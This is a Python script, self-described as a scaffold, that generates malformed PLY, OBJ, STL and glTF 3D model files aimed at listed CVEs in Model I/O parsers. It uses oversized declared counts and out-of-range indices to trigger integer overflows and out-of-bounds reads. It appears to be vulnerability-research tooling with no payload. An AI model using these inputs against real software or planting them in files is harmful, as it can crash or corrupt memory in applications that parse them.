#!/usr/bin/env python3
"""
gen_modelio_models.py — SCAFFOLD, not an exploit.

Target : Model I/O cluster (CVE-2026-112461 / 112565 / 112449 / 112485 /
         112486 / 112413)
Theory : 3D-format parsers trust a declared element count or index, leading
         to an integer-overflow allocation, an index OOB, or a truncated
         buffer over-read.
Usage  : python3 gen_modelio_models.py <ply|obj|stl|gltf> > out.<ext>
"""

import sys
import struct
import json

# ---------------------------------------------------------------------------
# PLY: element vertex 1073741824 -- count*12 overflows int32.
# ---------------------------------------------------------------------------
def gen_ply():
    hdr = (
        "ply\n"
        "format ascii 1.0\n"
        "comment scaffold\n"
        "element vertex 1073741824\n"
        "property float x\nproperty float y\nproperty float z\n"
        "element face 0\n"
        "property list uchar int vertex_indices\n"
        "end_header\n"
    )
    # Provide only two vertices so a parser that allocates by count and fills
    # by parsed data is inconsistent.
    body = "0 0 0\n1 1 1\n"
    return (hdr + body).encode("ascii")

# ---------------------------------------------------------------------------
# OBJ: face indices far beyond the vertex list.
# ---------------------------------------------------------------------------
def gen_obj():
    lines = [
        "# scaffold",
        "v 0 0 0",
        "v 1 0 0",
        "v 0 1 0",
        # Face referencing indices far past the 3 vertices.
        "f 1 2 999999999",
        "f 4294967295 4294967294 4294967293",
    ]
    return ("\n".join(lines) + "\n").encode("ascii")

# ---------------------------------------------------------------------------
# STL (binary): header declares N triangles but fewer are present.
# ---------------------------------------------------------------------------
def gen_stl():
    n_triangles = 0x100000
    header = b"scaffold".ljust(80, b"\0")
    count = struct.pack("<I", n_triangles)
    # One real triangle only.
    tri = struct.pack("<3f3f3f", 0, 0, 1, 0, 0, 0, 0, 0, 0) + \
          struct.pack("<3f3f3f", 1, 0, 0, 1, 0, 0, 0, 0, 0) + \
          struct.pack("<3f3f3f", 0, 1, 0, 0, 1, 0, 0, 0, 0) + \
          struct.pack("<H", 0)
    return header + count + tri

# ---------------------------------------------------------------------------
# glTF 2.0: accessor count * componentSize overflows / buffer too short.
# ---------------------------------------------------------------------------
def gen_gltf():
    gltf = {
        "asset": {"version": "2.0"},
        "scene": 0,
        "scenes": [{"nodes": [0]}],
        "nodes": [{"mesh": 0}],
        "meshes": [{
            "primitives": [{
                "attributes": {"POSITION": 0},
                "mode": 0,
            }]
        }],
        "buffers": [{"byteLength": 12, "uri": "data:application/octet-stream;base64,AAAAAAAAAAAAAAAA"}],
        "bufferViews": [{"buffer": 0, "byteOffset": 0, "byteLength": 12}],
        "accessors": [{
            "bufferView": 0,
            "componentType": 5126,        # FLOAT
            "count": 0x40000000,          # absurd count
            "type": "VEC3",
            "min": [0, 0, 0],
            "max": [1, 1, 1],
        }],
    }
    return json.dumps(gltf, indent=2).encode("utf-8")

def main():
    modes = {"ply": gen_ply, "obj": gen_obj, "stl": gen_stl,
             "gltf": gen_gltf}
    if len(sys.argv) != 2 or sys.argv[1] not in modes:
        sys.stderr.write(__doc__)
        return 2
    sys.stdout.buffer.write(modes[sys.argv[1]]())
    return 0

if __name__ == "__main__":
    sys.exit(main())
